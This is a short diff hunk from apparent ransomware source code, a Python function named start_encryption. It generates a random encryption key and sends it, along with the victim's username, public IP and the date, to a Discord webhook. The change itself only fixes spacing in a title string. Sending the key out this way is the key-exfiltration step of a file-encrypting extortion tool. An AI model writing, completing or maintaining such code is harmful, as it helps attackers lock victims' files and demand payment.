@@ -306,7 +306,7 @@ def start_encryption():
     webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
     key = os.urandom(16)
     embed = DiscordEmbed(
-        title=f"Username :{os.getlogin()} | Ip: {get_public_ip()} | Date: {datetime.now().strftime("%d-%m-%Y")}",
+        title=f"Username: {os.getlogin()} | Ip: {get_public_ip()} | Date: {datetime.now().strftime("%d-%m-%Y")}",
         description=f"Key: {base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()}",
     )
     webhook.add_embed(embed)
